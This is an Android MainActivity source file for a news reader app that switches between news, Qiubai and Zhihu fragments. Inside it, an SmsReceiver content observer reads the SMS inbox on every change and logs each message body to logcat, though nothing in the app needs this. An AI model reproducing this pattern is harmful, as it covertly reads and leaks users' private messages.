package comn.example.administrator.news.mvp.view;

import android.app.Fragment;
import android.app.FragmentManager;
import android.app.FragmentTransaction;
import android.content.ContentProvider;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.Handler;
import android.os.PersistableBundle;
import android.support.annotation.IdRes;
import android.support.annotation.Nullable;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.Window;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.Toast;

import java.util.ArrayList;

import comn.example.administrator.news.R;
import comn.example.administrator.news.fragment.mainFragment;
import comn.example.administrator.news.fragment.mvp.view.ZhihuhuFragment;
import comn.example.administrator.news.fragment.mvp.view.zhihuFragment;
import comn.example.administrator.news.fragment.qiubaiFragment;
import comn.example.administrator.news.qiubai.constract.view.qbFragment;
import comn.example.administrator.news.service.CacheService;
import comn.example.administrator.news.service.foreNotificationService;

public class MainActivity extends AppCompatActivity {
RadioGroup radioGroup;
    Intent startCacheService;
    //FragmentTransaction fragmentTransaction;
    ArrayList<Fragment>fragmentArrayList=new ArrayList<>();
    boolean news_stated=false;
    RadioButton rb_news,rb_qiubai,rb_zhihu;
Drawable news_white,news_red;
    mainFragment mainFragment;
    qbFragment qiubaiFragment;
    ZhihuhuFragment zhihuFragment;

    @Override
    protected void onCreate( Bundle savedInstanceState) {
        requestWindowFeature(Window.FEATURE_NO_TITLE);

        super.onCreate(savedInstanceState);
//fragmentTransaction=getFragmentManager().beginTransaction();

        setContentView(R.layout.activity_main);
        Uri uri=Uri.parse("content://com.example.news/haha");
        getContentResolver().registerContentObserver(Uri.parse("content://sms"),
                true,new SmsReceiver(new Handler()));
    /*    Cursor cursor=getContentResolver().query(uri,null,null,null,null);

        while (cursor.moveToNext()){
            Toast.makeText(this,cursor.getString(0),Toast.LENGTH_SHORT).show();


        }*/

                     if (savedInstanceState!=null){

/*
                         fragmentManager.putFragment(outState,"mainFragment",mainFragment);
                         fragmentManager.putFragment(outState,"qiubaiFragment",qiubaiFragment);
                         fragmentManager.putFragment(outState,"zhihuFragment",zhihuFragment);
                         */
                         FragmentManager fragmentManager=getFragmentManager();

                         mainFragment= (mainFragment)
                                 fragmentManager.
                                         getFragment(savedInstanceState,"mainFragment");
                       qiubaiFragment=(qbFragment)
                                 getFragmentManager().getFragment(savedInstanceState,
                                 "qiubaiFragment");
                 zhihuFragment=(ZhihuhuFragment)
                             getFragmentManager().getFragment(savedInstanceState,
                                     "zhihuFragment");

                     }

        startCacheService=new Intent(this,CacheService.class);
        startService(startCacheService);
        //bindService()
        startService(new Intent(this,foreNotificationService.class));
        news_white=getResources().getDrawable(R.drawable.ic_action_news_white);
 news_red=getResources().getDrawable(R.drawable.ic_action_news_red);
        //DiffUtil.DiffResult diffResult=DiffUtil.calculateDiff(new MyDifficult())
   radioGroup=(RadioGroup)findViewById(R.id.radioGroup);
        rb_news= (RadioButton)findViewById(R.id.rb_news);
        rb_news.post(new Runnable() {
            @Override
            public void run() {
                rb_news.performClick();
            }
        });

 /* mainFragment=new mainFragment();
        getFragmentManager().beginTransaction().add(R.id.main_fragment,mainFragment)
                .commit();*/
        /*getFragmentManager().beginTransaction().add(R.id.main_fragment,mainFragment)
        ;
        fragmentArrayList.add(mainFragment);
        fragmentArrayList.add(qiubaiFragment);
        fragmentArrayList.add(zhihuFragment);*/
        /* rb_news.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (!isChecked){
                    rb_news.setCompoundDrawablesWithIntrinsicBounds(null,news_white,null,null);
                  rb_news.setTextColor(Color.BLACK);
                   // rb_news.setChecked(true);


                }
                else if (isChecked){
                    rb_news.setCompoundDrawablesWithIntrinsicBounds(null,news_red,null,null);
                   rb_news.setTextColor(Color.RED);
                   // rb_news.setChecked(false);

                }
            }
        });*/
        //rb_news.setChecked(true);
        rb_qiubai= (RadioButton) findViewById(R.id.rb_qiubai);
        rb_zhihu= (RadioButton) findViewById(R.id.zhihu);
        radioGroup.setOnCheckedChangeListener(new RadioGroup.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(RadioGroup group, @IdRes int checkedId) {
               // RadioButton radioButton= (RadioButton) findViewById(group.getCheckedRadioButtonId());
                FragmentTransaction fragmentTransaction=
                        getFragmentManager().beginTransaction();

                switch (checkedId){
                     case R.id.rb_qiubai:
                      hideAllFragment(fragmentTransaction);
                   //   rb_news.setChecked(!rb_news.isChecked());
                   /*  rb_news.setChecked(false);
                      rb_qiubai.setChecked(true);*/
                 if (qiubaiFragment==null){
                     //qiubaiFragment=new qiubaiFragment();
                   qiubaiFragment=new qbFragment();
                     fragmentTransaction.add(R.id.main_fragment,qiubaiFragment)
                      //  .addToBackStack(null)
                     ;
                 }
                 else {
                     fragmentTransaction.show(qiubaiFragment);

                 }
                      break;
                  case R.id.zhihu:

                      hideAllFragment(fragmentTransaction);

                      if (zhihuFragment==null){

                          zhihuFragment=new ZhihuhuFragment();
                          fragmentTransaction.add(R.id.main_fragment,zhihuFragment)
                                  //.addToBackStack(null)
                          ;
                      }
                      else {
                          fragmentTransaction.show(zhihuFragment);

                      }

                     break;
                  case R.id.rb_news:

                      hideAllFragment(fragmentTransaction);
                      //rb_news.setChecked(true);
                       if (mainFragment==null){
                           mainFragment=new mainFragment();
                           fragmentTransaction.add(R.id.main_fragment,mainFragment)
                        //   .addToBackStack(null)
                           ;
                       }
                       else {
                            fragmentTransaction.show(mainFragment);
                       }
                     //break;
                     /* mainFragment mainFragment;


                      mainFragment=new mainFragment();
                      getFragmentManager().beginTransaction().
                              replace(R.id.main_fragment,mainFragment)
                              .addToBackStack(null)
                              .commit();*/
                      break;

              }
                fragmentTransaction.commit();
            }
        });

    }
public void hideAllFragment(FragmentTransaction fragmentTransaction){
     if (mainFragment!=null){
         fragmentTransaction.hide(mainFragment);
     }
    if (qiubaiFragment!=null){
        fragmentTransaction.hide(qiubaiFragment);
    }
    if (zhihuFragment!=null){
        fragmentTransaction.hide(zhihuFragment);
    }

}
//加载主fragment
  /* @Override
    protected Fragment createFragment() {

        BasicFragment fragment=new mainFragment();
        return fragment;
    }*/

    @Override
    public void onBackPressed() {
        finish();
        super.onBackPressed();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
   //stopService(startCacheService);
    }


    @Override
    protected void onSaveInstanceState(Bundle outState) {
       super.onSaveInstanceState(outState);
        Log.d("test12344","onSaveInstance");
        FragmentManager fragmentManager=getFragmentManager();
     if (mainFragment!=null) {
         fragmentManager.putFragment(outState, "mainFragment", mainFragment);
     }
     if (qiubaiFragment!=null) {
         fragmentManager.putFragment(outState, "qiubaiFragment", qiubaiFragment);
     }
     if (zhihuFragment!=null) {
         fragmentManager.putFragment(outState, "zhihuFragment", zhihuFragment);
     }

     /*   mainFragment= (mainFragment)
                getFragmentManager().getFragment(savedInstanceState,"mainFragment");
        qiubaiFragment=(qiubaiFragment)
                getFragmentManager().getFragment(savedInstanceState,"qiubaiFragment");
        zhihuFragment=(ZhihuhuFragment)
                getFragmentManager().getFragment(savedInstanceState,"zhihuFragment");*/


    }

public class SmsReceiver extends ContentObserver{
    /**
     * Creates a content observer.
     *
     * @param handler The handler to run {@link #onChange} on, or null if none.
     */
    public SmsReceiver(Handler handler) {
        super(handler);
    }

    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
    final Cursor cursor=getContentResolver().
            query(Uri.parse("content://sms/inbox"),null,null,null,null);
        Log.d("sms",cursor.getCount()+"");

        while (cursor.moveToNext()){
            Log.d("sms",cursor.getString(cursor.getColumnIndex("body")));
  }

cursor.close();
    }
}


}
